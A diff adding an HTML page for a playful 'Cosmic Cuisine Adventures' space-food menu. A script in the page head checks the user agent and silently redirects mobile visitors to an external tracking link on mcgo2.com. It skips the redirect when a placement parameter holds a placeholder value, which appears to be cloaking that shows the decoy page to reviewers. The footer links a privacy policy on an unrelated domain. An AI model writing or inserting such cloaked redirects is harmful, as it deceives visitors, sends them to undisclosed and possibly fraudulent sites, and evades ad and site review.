@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Cuisine Adventures</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            background-color: #45B7D1;
+            padding: 20px;
+            text-align: center;
+            border-radius: 15px;
+        }
+        main {
+            grid-column: 1 / 3;
+            background-color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: #FFA07A;
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            border-radius: 15px;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #FFFF00;
+        }
+        .food-item {
+            background-color: #98FB98;
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Cuisine Adventures</h1>
+        </header>
+        <main>
+            <h2>Intergalactic Menu</h2>
+            <div class="food-item">
+                <h3>Martian Meatballs</h3>
+                <p>Spicy spheres of mystery meat from the red planet.</p>
+            </div>
+            <div class="food-item">
+                <h3>Nebula Noodles</h3>
+                <p>Glowing strands of pasta infused with stardust.</p>
+            </div>
+            <div class="food-item">
+                <h3>Saturnian Smoothie</h3>
+                <p>A swirling blend of exotic fruits from Saturn's moons.</p>
+            </div>
+        </main>
+        <aside>
+            <h2>Daily Special</h2>
+            <p>Try our Asteroid Appetizers! Crunchy space rocks with a tangy dipping sauce.</p>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Cuisine Adventures. All rights reserved.</p>
+            <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
